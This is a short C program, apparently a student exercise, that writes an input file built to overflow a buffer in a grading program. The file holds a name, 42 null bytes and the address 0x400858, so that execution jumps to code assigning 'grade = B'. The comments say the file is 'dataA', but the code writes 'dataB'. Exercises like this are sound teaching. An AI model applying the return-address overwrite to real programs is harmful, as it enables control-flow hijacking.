/*---------------------------------------------*/
/*createdataA.c                                */
/*Author: Calvin Nguyen and Alex Eng           */
/*---------------------------------------------*/


#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>


/*Main function creates a file called dataA or overwrites
  dataA if it already exists. outputs a new file called 
  dataA that contains our name, null chars, and an address */
int main(void)
{

   /*variable to traverse loop*/
   int i;

   /*file to be added on*/
   FILE *psFile;

   /*address of "grade = B"*/
   unsigned long address;

   /*assigning values*/
   psFile = fopen("dataB", "w");
   address = 0x0000000000400858;
   
   /*writing our name into the file */
   /*writes 6 bytes*/
   fprintf(psFile, "%c", 'C');
   fprintf(psFile, "%c", 'a');
   fprintf(psFile, "%c", 'l');
   fprintf(psFile, "%c", 'v');
   fprintf(psFile, "%c", 'i');
   fprintf(psFile, "%c", 'n');

   /*writing 42 null chars */
   for (i = 0; i < 42; i++)
      fprintf(psFile, "%c", '\0');

   /*going to address 0x400858
     added 10 additional hex values since 400858 is only 3 bytes
     so we need 5 more bytes = 10 digits of HEX
     0x0000000000400858 */
   fwrite(&address, sizeof(unsigned long), 1, psFile);

   fclose(psFile);

   return 0;
      
}
